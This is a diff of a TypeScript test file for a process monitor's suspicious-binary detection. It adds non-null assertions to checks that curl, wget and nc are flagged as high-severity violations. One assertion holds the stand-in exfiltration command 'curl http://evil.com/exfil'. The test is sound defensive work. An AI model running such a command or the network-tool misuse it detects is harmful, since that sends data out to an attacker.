@@ -42,8 +42,8 @@ describeWithCapability('process-monitoring', 'AT-PROC-002: Suspicious Binary Det
 
     const events = arp.getEventsByCategory('violation');
     expect(events.length).toBe(1);
-    expect(events[0].data.binary).toBe('curl');
-    expect(events[0].data.command).toBe('curl http://evil.com/exfil');
+    expect(events[0].data!.binary).toBe('curl');
+    expect(events[0].data!.command).toBe('curl http://evil.com/exfil');
     expect(events[0].severity).toBe('high');
   });
 
@@ -63,7 +63,7 @@ describeWithCapability('process-monitoring', 'AT-PROC-002: Suspicious Binary Det
 
     const events = arp.getEventsByCategory('violation');
     expect(events.length).toBe(1);
-    expect(events[0].data.binary).toBe('wget');
+    expect(events[0].data!.binary).toBe('wget');
     expect(events[0].severity).toBe('high');
   });
 
@@ -83,7 +83,7 @@ describeWithCapability('process-monitoring', 'AT-PROC-002: Suspicious Binary Det
 
     const events = arp.getEventsByCategory('violation');
     expect(events.length).toBe(1);
-    expect(events[0].data.binary).toBe('nc');
+    expect(events[0].data!.binary).toBe('nc');
     expect(events[0].severity).toBe('high');
   });
 
@@ -112,7 +112,7 @@ describeWithCapability('process-monitoring', 'AT-PROC-002: Suspicious Binary Det
     const violations = arp.getEventsByCategory('violation');
     expect(violations.length).toBe(3);
 
-    const detectedBinaries = violations.map((e) => e.data.binary);
+    const detectedBinaries = violations.map((e) => e.data!.binary);
     expect(detectedBinaries).toContain('curl');
     expect(detectedBinaries).toContain('wget');
     expect(detectedBinaries).toContain('nc');
